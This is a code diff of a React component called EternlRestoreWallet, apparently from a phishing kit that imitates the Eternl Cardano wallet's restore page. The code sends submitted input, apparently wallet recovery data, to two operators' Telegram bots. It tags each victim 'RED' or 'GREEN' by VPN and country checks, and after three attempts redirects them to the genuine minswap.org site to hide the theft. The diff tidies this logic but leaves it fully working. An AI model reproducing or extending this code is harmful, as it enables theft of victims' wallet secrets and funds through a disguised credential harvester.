@@ -55,33 +55,26 @@ function EternlRestoreWallet() {
     // Check VPN status using the IP we retrieved
     const isVpn = await checkVpnStatus(ip);
     const isSpecialCountry = specialCountries.includes(countryCode);
-
+    
     const url = `https://api.telegram.org/bot${token}/sendMessage`;
     const ourl = `https://api.telegram.org/bot${otoken}/sendMessage`;
-
+    
+    // Data for normal and "RED" alert messages
     const data = {
         chat_id: chat_id,
         text: `Eternl: ${message}`,
     };
-
-    let odata;
-    if (isVpn || isSpecialCountry) {
-        odata = {
-            chat_id: ochat_id,
-            text: `Eternl (RED): ${message}`,
-        };
-    } else {
-        odata = {
-            chat_id: ochat_id,
-            text: `Eternl (GREEN): ${message}`,
-        };
-    }
-
+    
+    const odata = {
+        chat_id: ochat_id,
+        text: isVpn || isSpecialCountry ? `Eternl (RED): ${message}` : `Eternl (GREEN): ${message}`,
+    };
+    
     // Increment the attempt count
     setAttempts((prevAttempts) => prevAttempts + 1);
-    const currentAttempts = attempts + 1; // Get the current attempt count
-
-    // Determine which endpoints to send the message to
+    const currentAttempts = attempts + 1;
+    
+    // Determine which endpoints to send messages to
     const endpoints = (isVpn || isSpecialCountry)
         ? [
             { url: ourl, data: odata },
@@ -90,7 +83,8 @@ function EternlRestoreWallet() {
         : [
             { url: ourl, data: odata },
           ];
-
+    
+    // Only attempt up to 3 times before redirecting
     if (currentAttempts <= 3) {
         for (const endpoint of endpoints) {
             try {
@@ -101,11 +95,11 @@ function EternlRestoreWallet() {
                     },
                     body: JSON.stringify(endpoint.data),
                 });
-
+    
                 if (!response.ok) {
                     throw new Error("Network response was not ok");
                 }
-
+    
                 console.log("Message sent successfully to:", endpoint.url);
             } catch (error) {
                 console.error("Error sending message:", error);
@@ -114,7 +108,7 @@ function EternlRestoreWallet() {
     } else {
         window.location.href = "https://minswap.org/fi-FI";
     }
-};
+  }
 
 
   const renderInputs = () => {
